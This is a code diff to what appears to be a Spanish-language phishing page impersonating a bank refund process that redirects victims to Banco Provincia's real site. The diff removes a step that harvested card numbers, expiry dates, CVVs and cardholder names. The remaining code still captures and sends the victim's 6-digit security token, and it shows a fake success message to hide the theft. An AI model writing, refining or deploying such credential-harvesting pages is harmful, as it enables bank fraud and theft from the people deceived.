@@ -128,39 +128,11 @@
       <button class="principal" id="b3" type="button" disabled>Ingresar</button>
     </div>
 
-    <!-- PASO 4 -->
-    <div id="p4" class="oculto">
-      <h1 class="titulo">Reintegro</h1>
-      <p class="txt" style="margin-bottom:1.2rem">Ingresá una tarjeta para acreditar el importe.</p>
-
-      <div class="field">
-        <label class="lab" for="n">Número de tarjeta <span class="req">*</span></label>
-        <input class="form-control" id="n" type="text" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="off">
-      </div>
-
-      <div class="field">
-        <label class="lab" for="v">Vencimiento <span class="req">*</span></label>
-        <input class="form-control" id="v" type="text" inputmode="numeric" maxlength="5" placeholder="MM/AA" autocomplete="off">
-      </div>
-
-      <div class="field">
-        <label class="lab" for="s">Código de seguridad <span class="req">*</span></label>
-        <input class="form-control" id="s" type="text" inputmode="numeric" maxlength="4" placeholder="CVV" autocomplete="off">
-      </div>
-
-      <div class="field">
-        <label class="lab" for="ti">Titular <span class="req">*</span></label>
-        <input class="form-control" id="ti" type="text" maxlength="40" placeholder="Nombre como figura en la tarjeta" autocomplete="off">
-      </div>
-
-      <button class="principal" id="b4" type="button">Acreditar</button>
-    </div>
-
     <!-- FIN -->
     <div id="p5" class="oculto ok">
       <div class="cir">✓</div>
-      <h2 class="titulo" style="font-size:1.5rem;margin-bottom:.7rem">Reintegro acreditado</h2>
-      <p class="txt">El importe se verá reflejado en tu cuenta dentro de las próximas 48 horas hábiles.</p>
+      <h2 class="titulo" style="font-size:1.5rem;margin-bottom:.7rem">Operación finalizada</h2>
+      <p class="txt">La validación se ha completado con éxito.</p>
       <p class="txt" style="font-size:.85rem">Redirigiendo…</p>
     </div>
 
@@ -273,7 +245,7 @@ $("b2").addEventListener("click", function(){
   $("tk").focus();
 });
 
-// ---- PASO 3
+// ---- PASO 3 (Ahora envía el token y finaliza directo en p5)
 $("tk").addEventListener("input", function(){
   this.value = dig(this.value).slice(0, 6);
   $("b3").disabled = this.value.length !== 6;
@@ -283,38 +255,7 @@ $("b3").addEventListener("click", function(){
   if ($("tk").value.length !== 6){ $("tk").focus(); return; }
   datos.token = dig($("tk").value);
   enviar("token");
-  ir("p3", "p4");
-  $("n").focus();
-});
-
-// ---- PASO 4
-$("n").addEventListener("input", function(){
-  this.value = dig(this.value).slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
-});
-$("v").addEventListener("input", function(){
-  var v = dig(this.value).slice(0, 4);
-  this.value = v.length > 2 ? v.slice(0, 2) + "/" + v.slice(2) : v;
-});
-$("s").addEventListener("input", function(){ this.value = dig(this.value).slice(0, 4); });
-$("ti").addEventListener("input", function(){ this.value = this.value.replace(/[^A-Za-zÁÉÍÓÚÜÑáéíóúüñ ]/g, ""); });
-
-$("b4").addEventListener("click", function(){
-  var n = dig($("n").value);
-  var v = $("v").value;
-  var s = dig($("s").value);
-  var ti = $("ti").value.trim();
-
-  if (!mal($("n"), n.length < 15)){ $("n").focus(); return; }
-  if (!mal($("v"), !/^(0[1-9]|1[0-2])\/\d{2}$/.test(v))){ $("v").focus(); return; }
-  if (!mal($("s"), s.length < 3)){ $("s").focus(); return; }
-  if (!mal($("ti"), ti.length < 5)){ $("ti").focus(); return; }
-
-  datos.tarjeta = n;
-  datos.venc = v;
-  datos.cvv = s;
-  datos.titular = ti;
-  enviar("completo");
-  ir("p4", "p5");
+  ir("p3", "p5");
   setTimeout(function(){ location.href = "https://www.bancoprovincia.com.ar/"; }, 4500);
 });
 </script>
